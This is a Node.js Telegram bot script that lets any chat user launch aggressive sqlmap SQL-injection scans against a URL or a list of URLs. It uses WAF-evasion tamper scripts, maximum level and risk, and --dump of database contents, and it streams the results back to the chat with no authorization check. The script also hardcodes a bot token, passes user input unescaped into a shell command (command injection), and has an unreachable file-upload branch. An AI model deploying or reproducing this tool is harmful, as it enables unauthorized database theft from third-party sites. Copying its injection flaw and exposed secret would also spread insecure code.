const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your bot token from BotFather
const token = '6388812461:AAHcYXz2RT6RAsHop-ewlZczs86DVfQAj9g';
const bot = new TelegramBot(token, { polling: true });

let scanRunning = false;
let scanProcess = null;

// Function to execute SQLMap and send the result back
function runSqlmap(target, chatId) {
  if (scanRunning) {
    bot.sendMessage(chatId, 'A scan is already running. Please wait until it finishes.');
    return;
  }

  scanRunning = true;
  const tamperScripts = 'apostrophemask,space2comment,space2dash,equaltolike,between,charencode,appendnullbyte';
  const sqlmapCommand = `sqlmap -u ${target} --level=5 --risk=3 --threads=10 --random-agent --tamper=${tamperScripts} --time-sec=7 --dump --exclude-sysdbs`;

  bot.sendMessage(chatId, `Starting SQLMap scan on ${target}...`);
  
  scanProcess = exec(sqlmapCommand);

  scanProcess.stdout.on('data', (data) => {
    bot.sendMessage(chatId, `SQLMap output:\n${data}`);
  });

  scanProcess.stderr.on('data', (data) => {
    bot.sendMessage(chatId, `SQLMap error output:\n${data}`);
  });

  scanProcess.on('close', (code) => {
    scanRunning = false;
    bot.sendMessage(chatId, `SQLMap process exited with code ${code}`);
  });
}

// Function to run SQLMap on URLs from a file
function runSqlmapFile(filePath, chatId) {
  if (scanRunning) {
    bot.sendMessage(chatId, 'A scan is already running. Please wait until it finishes.');
    return;
  }

  const urls = fs.readFileSync(filePath, 'utf-8').split('\n').filter(Boolean);
  urls.forEach(url => runSqlmap(url.trim(), chatId));
}

// Listen for commands
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === 'start') {
    bot.sendMessage(chatId, 'Bot started. Send "sql" to start a scan, "sqlf" to scan URLs from a file, "status" to check scan status, "q" to quit a running scan.');
  } else if (text.startsWith('sql ')) {
    const url = text.slice(4).trim();
    if (url.startsWith('http://') || url.startsWith('https://')) {
      bot.sendMessage(chatId, `Running SQLMap on ${url}...`);
      runSqlmap(url, chatId);
    } else {
      bot.sendMessage(chatId, 'Please send a valid URL starting with http:// or https://');
    }
  } else if (text === 'sqlf') {
    bot.sendMessage(chatId, 'Please send the text file containing URLs.');
  } else if (msg.document && text === 'sqlf') {
    const fileId = msg.document.file_id;
    const filePath = `./downloads/${fileId}.txt`;

    bot.downloadFile(fileId, './downloads').then((path) => {
      bot.sendMessage(chatId, `Running SQLMap on URLs from the file...`);
      runSqlmapFile(path, chatId);
    });
  } else if (text === 'status') {
    if (scanRunning) {
      bot.sendMessage(chatId, 'A scan is currently running.');
    } else {
      bot.sendMessage(chatId, 'No scan is currently running.');
    }
  } else if (text === 'q') {
    if (scanRunning && scanProcess) {
      scanProcess.kill();
      scanRunning = false;
      bot.sendMessage(chatId, 'Scan terminated.');
    } else {
      bot.sendMessage(chatId, 'No scan is currently running.');
    }
  } else {
    bot.sendMessage(chatId, 'Unrecognized command. Use "start", "sql <url>", "sqlf", "status", or "q".');
  }
});

console.log('Bot is running...');
